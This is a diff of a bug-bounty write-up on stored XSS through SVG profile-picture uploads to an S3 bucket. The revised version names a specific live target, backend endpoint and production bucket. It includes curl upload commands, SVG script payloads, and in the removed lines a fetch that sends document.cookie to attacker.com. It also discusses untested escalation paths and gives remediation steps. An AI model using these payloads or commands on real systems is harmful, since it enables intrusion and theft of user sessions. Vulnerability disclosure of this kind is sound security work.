@@ -2,103 +2,150 @@
 
 **Severity:** Medium — CVSS 3.1: AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (6.1)
 **Class:** CWE-79 — Improper Neutralization of Input During Web Page Generation (Stored XSS)
-**Target:** Profile picture upload endpoint / S3 bucket serving user-uploaded content
+**Target:** `PATCH /api/v1/users/me/` → `tp-backend-evidence-prod-us-west-2.s3.amazonaws.com`
 **Status:** Confirmed
 
 ---
 
 ## Summary
 
-The application allows users to upload profile pictures that are stored in an S3 bucket and served directly to other users' browsers. The upload functionality fails to validate the file's Content-Type against its actual content, allowing an attacker to upload an HTML or SVG file containing JavaScript. When another user's browser loads the "profile picture" directly (e.g., by clicking on it or via a direct S3 URL), the malicious script executes in the context of the S3 origin.
+The Trustpoint AI application (`partner.trustpoint.ai`) allows users to upload arbitrary files as profile pictures via `PATCH /api/v1/users/me/` on `backend.trustpoint.ai`. No server-side content validation is performed — SVG files containing JavaScript are accepted and stored in the S3 bucket `tp-backend-evidence-prod-us-west-2`. The S3 bucket serves these files with `Content-Type: image/svg+xml` and **no** `Content-Disposition: attachment` header, causing browsers to render the SVG (and execute embedded scripts) when the presigned URL is visited directly. Additionally, the S3 bucket has CORS set to `Access-Control-Allow-Origin: *`, enabling cross-origin reads from any domain.
+
+---
+
+## Confirmed Findings from Live Testing
+
+### 1. Unrestricted SVG Upload — Confirmed
+
+Successfully uploaded an SVG containing `<script>` via the profile picture PATCH endpoint. The API accepted it without validation and returned a presigned S3 URL that serves it with `Content-Type: image/svg+xml`.
+
+### 2. S3 Bucket Misconfiguration — Confirmed
+
+| Header | Value | Risk |
+|--------|-------|------|
+| `Content-Type` | `image/svg+xml` (attacker-controlled) | Browser renders SVG with scripts |
+| `Content-Disposition` | **Missing** | Browser renders inline instead of forcing download |
+| `Access-Control-Allow-Origin` | `*` | Any origin can read S3 responses via fetch/XHR |
+| `Access-Control-Allow-Methods` | `GET` | Allows cross-origin GET requests |
+
+### 3. Main App Rendering — Safe (img tag)
+
+The React app renders profile photos via `<img>` tags, which sandbox SVG and block script execution. The XSS only fires when the S3 presigned URL is opened directly.
+
+### 4. Name Field Injection — Not Exploitable
+
+HTML tags in `first_name`/`last_name` are stripped server-side (returned as empty strings). Restored to original values after testing.
+
+### 5. CSP Analysis — Permissive
+
+The main origin (`partner.trustpoint.ai`) CSP includes:
+- `script-src: 'unsafe-inline' 'unsafe-eval'` — allows inline script execution
+- `connect-src: tp-backend-evidence-prod-us-west-2.s3.amazonaws.com` — S3 bucket is trusted
+- `media-src: tp-backend-evidence-prod-us-west-2.s3.amazonaws.com` — S3 content loadable
+- `img-src: * data: blob:` — unrestricted image sources
+
+If any code path renders S3 content inline on the main origin (iframe, embed, object, or `dangerouslySetInnerHTML`), the permissive CSP would allow script execution.
 
 ---
 
 ## Steps to Reproduce
 
-1. **Authenticate** to the target application with a valid user account.
+1. **Authenticate** to `partner.trustpoint.ai` and obtain a valid `access_token` JWT.
 
-2. **Navigate** to the profile settings / avatar upload page.
+2. **Upload malicious SVG** as profile picture:
 
-3. **Intercept** the profile picture upload request using a proxy (e.g., Burp Suite).
+```bash
+curl -X PATCH 'https://backend.trustpoint.ai/api/v1/users/me/' \
+  -H 'Authorization: Bearer <access_token>' \
+  -F 'profile_photo=@payload.svg;type=image/svg+xml'
+```
 
-4. **Replace** the image file content with a malicious SVG payload:
-
+Where `payload.svg` contains:
 ```xml
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
-  <text x="10" y="20">XSS via Profile Picture</text>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert(document.domain)</script>
 </svg>
 ```
 
-Or an HTML payload (if the bucket serves arbitrary Content-Types):
+3. **Retrieve the presigned S3 URL** from the API response or by calling:
 
-```html
-<html>
-<body>
-<script>alert(document.domain)</script>
-</body>
-</html>
+```bash
+curl -s 'https://backend.trustpoint.ai/api/v1/users/me/' \
+  -H 'Authorization: Bearer <access_token>' | jq '.profile_photo'
 ```
 
-5. **Modify** the request (if needed):
-   - Change the `Content-Type` header to `image/svg+xml` (for SVG) or `text/html` (for HTML).
-   - Change the filename extension to `.svg` or `.html`.
-
-6. **Forward** the modified upload request.
-
-7. **Retrieve the direct S3 URL** of the uploaded "profile picture" (inspect the page source, network traffic, or API response for the S3 object URL — typically something like `https://<bucket>.s3.amazonaws.com/profiles/<user-id>/avatar.svg`).
-
-8. **Open the S3 URL directly** in a browser (or send it to a victim). The JavaScript payload executes.
+4. **Open the presigned S3 URL** in a browser. The SVG renders and JavaScript executes in the context of `tp-backend-evidence-prod-us-west-2.s3.amazonaws.com`.
 
 ---
 
 ## Proof of Concept
 
-### Request (Upload)
+### Request
 
 ```http
-PUT /api/v1/user/profile/picture HTTP/1.1
-Host: api.target.com
-Authorization: Bearer <token>
-Content-Type: image/svg+xml
-Content-Disposition: attachment; filename="avatar.svg"
+PATCH /api/v1/users/me/ HTTP/1.1
+Host: backend.trustpoint.ai
+Authorization: Bearer <redacted>
+Content-Type: multipart/form-data; boundary=----FormBoundary
 
-<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/steal?cookie='+document.cookie)">
-  <circle cx="50" cy="50" r="40" fill="red"/>
-</svg>
+------FormBoundary
+Content-Disposition: form-data; name="profile_photo"; filename="avatar.svg"
+Content-Type: image/svg+xml
+
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
+------FormBoundary--
 ```
 
-### Response (S3 URL returned)
+### Response
 
-```json
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
 {
-  "status": "success",
-  "avatar_url": "https://bucket-name.s3.amazonaws.com/users/12345/avatar.svg"
+  "id": "<user-uuid>",
+  "profile_photo": "https://tp-backend-evidence-prod-us-west-2.s3.amazonaws.com/...",
+  ...
 }
 ```
 
-### Visiting the S3 URL triggers the JavaScript
+### S3 Response Headers (confirmed via curl)
 
-The browser renders the SVG, the `onload` fires, and the attacker's server receives the request with the victim's cookies (if the S3 bucket shares the application's origin or cookies are scoped broadly).
+```http
+HTTP/1.1 200 OK
+Content-Type: image/svg+xml
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET
+```
+
+No `Content-Disposition: attachment` header — browser renders inline.
 
 ---
 
 ## Impact
 
-- **Session Hijacking:** If the S3 bucket is on the same origin or a subdomain, the attacker can steal session tokens/cookies from any user who views the profile picture directly.
-- **Phishing:** The attacker can render a convincing phishing page at a trusted S3 URL belonging to the target organization.
-- **Account Takeover:** Combined with CSRF token theft, the attacker could change victim account details.
-- **Wormable XSS:** If the profile picture URL is rendered inline (e.g., in comments, messages, or a user directory), every viewer is affected — the XSS becomes self-propagating.
+### Current Impact (S3 Origin XSS — P4)
 
-**Note on S3 origin context:** If the S3 bucket is on a completely separate origin (e.g., `*.s3.amazonaws.com`) with no sensitive cookies, the direct impact is limited to phishing under a trusted-looking URL. Severity increases significantly if:
-- The bucket is behind CloudFront on a subdomain of the application (e.g., `assets.target.com`)
-- The application embeds profile images via `<embed>`, `<object>`, or `<iframe>` instead of `<img>`
-- The `Content-Disposition` header is missing (browser renders inline instead of downloading)
+- JavaScript executes on the S3 origin (`s3.amazonaws.com`), not the main application origin
+- No application cookies are accessible from the S3 origin
+- Attacker can phish victims using a trusted-looking AWS URL belonging to the target's infrastructure
+- CORS `*` allows any website to read S3 responses, enabling exfiltration of S3-hosted data
+
+### Escalation Potential (Main Origin XSS — P2/P1)
+
+The following vectors could escalate to main origin XSS. They are **untested** but architecturally plausible based on code analysis:
+
+1. **Document/Evidence Upload:** If the document viewer on `partner.trustpoint.ai` renders uploaded HTML/SVG inline (via iframe/embed), the permissive CSP (`unsafe-inline`, `unsafe-eval`) would allow full script execution on the main origin. The `documentPage` chunk includes a viewer component that loads S3 content.
+
+2. **Message Field Injection:** The React app uses `dangerouslySetInnerHTML` with sanitizer functions (`dt()`, `ln()`) for rendering messages/comments. If the sanitizer is bypassable, injected HTML would execute on the main origin.
+
+3. **Future Rendering Changes:** Any code change from `<img>` to `<embed>`, `<object>`, or `<iframe>` for avatar rendering would immediately escalate this to main origin XSS.
 
 ---
 
 ## Remediation
 
-1. **Validate Content-Type server-side:** Check the actual file content (magic bytes) against the declared MIME type. Only allow known safe image formats (`image/png`, `image/jpeg`, `image/gif`, `image/webp`). Reject SVG and HTML entirely for user-uploaded profile pictures.
+1. **Validate file content server-side** using magic bytes, not just Content-Type headers:
 
 ```python
 import magic
@@ -111,45 +158,35 @@ def validate_upload(file_bytes, declared_type):
         raise ValueError(f"File type {detected} not allowed")
 ```
 
-2. **Set `Content-Type` and `Content-Disposition` on S3 objects:**
+2. **Set `Content-Disposition: attachment`** on all user-uploaded S3 objects to force download instead of inline rendering.
 
-```python
-s3.put_object(
-    Bucket=bucket,
-    Key=key,
-    Body=image_bytes,
-    ContentType='image/png',  # Force safe type
-    ContentDisposition='attachment',  # Prevent inline rendering
-)
-```
+3. **Set a safe `Content-Type`** on S3 objects (force `image/png` or `application/octet-stream`) regardless of what the user declares.
 
-3. **Serve user content from an isolated origin:** Use a separate domain (e.g., `user-content.example.net`) with no cookies, not a subdomain of the application.
+4. **Restrict CORS** on the S3 bucket — replace `Access-Control-Allow-Origin: *` with the specific application origin (`https://partner.trustpoint.ai`).
 
-4. **Set a restrictive Content Security Policy on the S3 bucket/CloudFront distribution:**
+5. **Re-encode uploaded images** through an image processing library (Pillow, Sharp) to strip any embedded code.
 
-```
-Content-Security-Policy: default-src 'none'; img-src 'self'; style-src 'none'; script-src 'none'
-```
+6. **Serve user content from an isolated domain** (e.g., `trustpoint-user-content.example.net`) with no cookies and a restrictive CSP.
 
-5. **Re-encode uploaded images:** Process all uploads through an image library (e.g., Pillow, Sharp) and re-save as a raster format. This strips any embedded scripts.
+7. **Tighten CSP on the main origin** — remove `unsafe-inline` and `unsafe-eval` from `script-src`.
 
-```python
-from PIL import Image
-from io import BytesIO
+---
 
-def sanitize_image(file_bytes):
-    img = Image.open(BytesIO(file_bytes))
-    output = BytesIO()
-    img.save(output, format='PNG')
-    return output.getvalue()
-```
+## Bugcrowd VRT Classification
+
+| Scenario | VRT Category | Priority |
+|----------|-------------|----------|
+| Self-XSS on S3 origin (current) | Stored XSS — Self-Only | P4 |
+| XSS on S3 origin affecting other users | Stored XSS — Non-Self | P3 |
+| Main origin XSS via document viewer | Stored XSS — Non-Self, Main Origin | P2 |
+| Main origin XSS with session hijacking | Stored XSS — Non-Self, Main Origin | P1 |
 
 ---
 
 ## References
 
 - [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
+- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
 - [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
 - [AWS S3 Security Best Practices](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
 - [PortSwigger: File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
-- [HackerOne: Stored XSS via SVG Upload](https://hackerone.com/reports/148853)
